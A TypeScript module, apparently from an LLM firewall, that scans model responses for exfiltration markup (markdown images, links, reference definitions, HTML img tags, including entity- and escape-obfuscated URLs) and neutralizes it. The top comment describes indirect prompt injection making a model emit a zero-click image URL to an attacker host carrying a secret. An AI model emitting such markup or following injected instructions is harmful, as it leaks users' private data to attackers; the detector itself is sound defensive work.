// Response-side exfiltration detection.
//
// A model whose context was poisoned (indirect prompt injection) often exfils
// data by emitting markup the CLIENT auto-renders. The classic zero-click vector
// is a markdown image — `![x](https://attacker/?d=<secret>)` — which the chat UI
// fetches immediately, leaking the query string to the attacker without the user
// ever clicking. Markdown/HTML links are the one-click variant. The firewall sees
// this in the model's RESPONSE, not the request, so it needs its own scan.
//
// This module is pure: it extracts candidate destinations from response text and
// asks an injected predicate whether each one is an exfil sink (the proxy backs
// that predicate with the existing UrlClassifier, so the allowlist, known-sink
// list, DGA and path-exfil heuristics are all reused). No network, no provider
// coupling — it scans the raw decoded body, so it works for every provider shape.

export interface ExfilFinding {
  /** The destination as the body holds it, so neutralizeExfil can find it. */
  url: string
  /** How the URL was embedded — markdown image is the highest concern (auto-fetched). */
  kind: 'markdown-image' | 'markdown-link' | 'html-image'
  reason: string
}

// Every destination is read the way a client reads it, then resolved against a
// base that no real sink uses. A relative destination lands on that base and is
// skipped; a scheme-relative `//host` resolves to https; a destination whose
// scheme is not http(s) is ignored (#580). Extraction therefore no longer
// requires a scheme prefix in the raw text: `https&#58;&#47;&#47;host`,
// `https:\host` and `\\host` all reach the same host in a browser.
const BASE = new URL('https://client.invalid/')
// A scheme: letters, then `:`. A destination without one is resolved against BASE.
const SCHEME_RE = /^[a-z][a-z\d+.-]*:/i
// `![alt](url)` and `[text](url)` are read from the `](` both share, in one
// pass (inlineDestinations). Patterns anchored on the opening bracket restarted
// at every `[` and ran to the end of the text when the markup never closed, on
// the thread serving every client: 6 s on 200 KB (GHSA-ggrw-cm2f-mh3c).
const BRACKET_RE = /!\[|\[|\]\(?/g
// A destination, after whitespace and an optional `<`. It stops at whitespace,
// ')' or '>'. Nothing follows the run, so it never backtracks.
const DEST_RE = /\s*<?([^\s)>]*)/y
// Deep enough for any real nesting, and it keeps `[[[[...` from filling memory.
// Past it an inner bracket is not tracked, which can only mislabel a finding.
const MAX_BRACKET_DEPTH = 1024
// `[label]: url` — a link reference definition (#574). `![alt][label]` (and
// `![label]`) fetch its URL like an inline image, so it is reported as one.
// Any `]:` before a destination counts, whatever starts the line: a definition
// may sit in a blockquote or a list item, its label may hold escapes, and the
// body is often raw JSON with escaped line breaks, so recognising "a definition
// line" exactly as a renderer does is a parser differential waiting to happen.
// The destination may follow on the next line, after one line ending, raw or
// JSON-escaped. A JSON-escaped backslash (`\\`) is kept inside the destination;
// a lone escape (`\n`, `\t`) ends it, since it is a line break or a tab.
const MD_DEF_RE = /\]:[ \t]*(?:(?:\r?\n|\\r\\n|\\n)[ \t]*)?<?((?:[^\s>"\\]|\\[^\sntr"])+)/gi
// `<img ... src="url">` — HTML image (some renderers allow raw HTML). Each tag
// is read once, to its `>` outside quotes (imgTags), and its src taken from that
// tag alone. The value is read to its closing quote, whatever it holds: an
// attribute value may contain a tab or newline the URL parser strips (#580). In
// a raw JSON body the quote arrives escaped (`src=\"...\"`), and a backslash
// that is not before the quote is part of the value. Each alternative is
// unambiguous, so the scan stays linear (GHSA-983r-9gmc-f3xr).
const IMG_OPEN_RE = /<img\b/gi
const SRC_ATTR_RE = /\bsrc\s*=\s*(?:\\?"([^"\\]*(?:\\(?!")[^"\\]*)*)|\\?'([^'\\]*(?:\\(?!')[^'\\]*)*)|([^\s"'>\\]+))/gi
// One level of JSON string escapes, undone before the destination is read.
// A serializer may write any character as `\uXXXX` (Go escapes `&`, `<` and `>`;
// others escape `:` or `/`), so the escape is decoded as well as the short ones.
const JSON_ESCAPE_RE = /\\(?:u([\dA-Fa-f]{4})|([nrt"\\/]))/g
const ENTITY_RE = /&(?:#(\d{1,7})|#x([\da-f]{1,6})|(colon|sol|bsol|tab|newline|lpar|rpar|quot|apos|amp|lt|gt));/gi
const NAMED_ENTITY: Readonly<Record<string, string>> = {
  colon: ':', sol: '/', bsol: '\\', tab: '\t', newline: '\n', lpar: '(', rpar: ')',
  quot: '"', apos: "'", amp: '&', lt: '<', gt: '>',
}
// What a backslash escapes in CommonMark; before anything else it is literal.
const CM_ESCAPE_RE = /\\([!-/:-@[-`{-~])/g
const WHITESPACE_RE = /\s/
const STRIPPED_RE = /[\t\n\r]/g

function decodeEntity(_all: string, dec: string | undefined, hex: string | undefined, name: string | undefined): string {
  const code = dec !== undefined ? parseInt(dec, 10) : hex !== undefined ? parseInt(hex, 16) : NaN
  if (!Number.isNaN(code)) return code > 0x10ffff ? '\uFFFD' : String.fromCodePoint(code)
  return NAMED_ENTITY[(name ?? '').toLowerCase()] ?? _all
}

function decodeJsonEscape(_all: string, hex: string | undefined, short: string | undefined): string {
  if (hex !== undefined) return String.fromCharCode(parseInt(hex, 16))
  return short === 'n' ? '\n' : short === 'r' ? '\r' : short === 't' ? '\t' : (short ?? '')
}

/**
 * The destination as a client resolves its text before fetching it. One level
 * of JSON escapes is undone first (a raw body doubles its backslashes), then
 * entities. A markdown destination ends at its first whitespace, which
 * CommonMark reads before any entity is decoded. An attribute value keeps its
 * whitespace to the quote, and the URL parser strips tabs and line breaks from
 * it. A backslash that survives is a slash for http(s), and a CommonMark escape
 * is unescaped first. Linear in `raw`.
 */
export function normalizeDestination(raw: string, attribute: boolean): string {
  let s = raw.replace(JSON_ESCAPE_RE, decodeJsonEscape)
  if (!attribute) {
    const end = s.search(WHITESPACE_RE)
    if (end >= 0) s = s.slice(0, end)
  }
  s = s.replace(ENTITY_RE, decodeEntity)
  if (!attribute) s = s.replace(CM_ESCAPE_RE, '$1')
  return s.replace(STRIPPED_RE, '').replace(/\\/g, '/')
}

/**
 * Every destination after a `](`, each read once: linear in `text`. A `](`
 * inside a destination that has not ended opens another one, so each of those
 * pieces is returned as well: a client that gives up on the outer markup may
 * still render the inner, and rereading from each `](` to the end of the run
 * would be quadratic. An image is one whose own opening bracket is `![`.
 */
function inlineDestinations(text: string): { url: string; image: boolean }[] {
  const found: { url: string; image: boolean }[] = []
  const open: boolean[] = []
  BRACKET_RE.lastIndex = 0
  for (let m = BRACKET_RE.exec(text); m !== null; m = BRACKET_RE.exec(text)) {
    const token = m[0]
    if (token === '[' || token === '![') {
      if (open.length < MAX_BRACKET_DEPTH) open.push(token === '![')
      continue
    }
    const image = open.pop() === true
    if (token === ']') continue
    DEST_RE.lastIndex = BRACKET_RE.lastIndex
    const url = DEST_RE.exec(text)?.[1] ?? ''
    BRACKET_RE.lastIndex = DEST_RE.lastIndex
    found.push({ url, image })
    if (url.includes('](')) {
      for (const inner of url.split('](')) found.push({ url: inner.replace(/^</, ''), image })
    }
  }
  return found
}

/** The text of each `<img ...>` tag, each read once: linear in `text`. */
function imgTags(text: string): string[] {
  const tags: string[] = []
  IMG_OPEN_RE.lastIndex = 0
  for (let m = IMG_OPEN_RE.exec(text); m !== null; m = IMG_OPEN_RE.exec(text)) {
    let i = m.index + m[0].length
    let quote = ''
    for (; i < text.length; i++) {
      const c = text[i]
      if (quote) { if (c === quote) quote = '' }
      else if (c === '"' || c === "'") quote = c
      else if (c === '>') break
    }
    tags.push(text.slice(m.index, i + 1))
    IMG_OPEN_RE.lastIndex = i + 1
  }
  return tags
}

/** The host and path a client would fetch for `raw`, or null when it is not http(s). */
function resolveDestination(raw: string, attribute: boolean): { hostname: string; path: string } | null {
  // Most destinations in a long body are empty or relative, and a parse that
  // throws costs far more than one that does not, so both are decided first.
  const text = normalizeDestination(raw, attribute)
  if (!text) return null
  try {
    // Absolute first: `https:/host` with no base is https://host, while resolved
    // against an https base it would be a same-site path (#580). Only a
    // destination with no scheme (`/x`, `//host`) takes the base.
    const url = SCHEME_RE.test(text) ? new URL(text) : new URL(text, BASE)
    if (url.protocol !== 'https:' && url.protocol !== 'http:') return null
    if (url.hostname === BASE.hostname) return null
    return { hostname: url.hostname, path: url.pathname + url.search }
  } catch {
    return null
  }
}

/**
 * Scan response text for exfiltration markup.
 *
 * @param text       the decoded model response (raw JSON/SSE text is fine — URLs
 *                   live inside the text fields and are matched literally)
 * @param isExfil    predicate deciding whether a (hostname, path) is an exfil
 *                   sink; backed by UrlClassifier in production
 * @returns deduped findings, markdown images first (highest concern)
 */
export function scanResponseExfil(
  text: string,
  isExfil: (hostname: string, path: string) => boolean,
): ExfilFinding[] {
  if (!text) return []
  const findings: ExfilFinding[] = []
  const seen = new Set<string>()

  const judge = (url: string, kind: ExfilFinding['kind']) => {
    const parsed = resolveDestination(url, kind === 'html-image')
    if (parsed && isExfil(parsed.hostname, parsed.path)) {
      const key = kind + '|' + url
      if (!seen.has(key)) {
        seen.add(key)
        findings.push({ url, kind, reason: `${kind} points at an exfiltration destination (${parsed.hostname})` })
      }
    }
  }
  const scan = (re: RegExp, kind: ExfilFinding['kind'], input = text) => {
    re.lastIndex = 0
    for (let m = re.exec(input); m !== null; m = re.exec(input)) {
      const url = m.slice(1).find(g => g)
      if (url) judge(url, kind)
      if (m.index === re.lastIndex) re.lastIndex++
    }
  }

  const inline = inlineDestinations(text)
  for (const d of inline) if (d.image) judge(d.url, 'markdown-image')
  scan(MD_DEF_RE, 'markdown-image')
  for (const tag of imgTags(text)) scan(SRC_ATTR_RE, 'html-image', tag)
  for (const d of inline) if (!d.image) judge(d.url, 'markdown-link')
  return findings
}

/**
 * Neutralize exfil URLs in a (buffered) response body by replacing each offending
 * URL with an inert placeholder, keeping the surrounding text/JSON intact so the
 * agent still receives a valid turn — just without the auto-fetch.
 */
export function neutralizeExfil(body: string, findings: ExfilFinding[]): string {
  let out = body
  for (const f of findings) {
    out = out.split(f.url).join('llm-fw-blocked-exfil-url')
  }
  return out
}
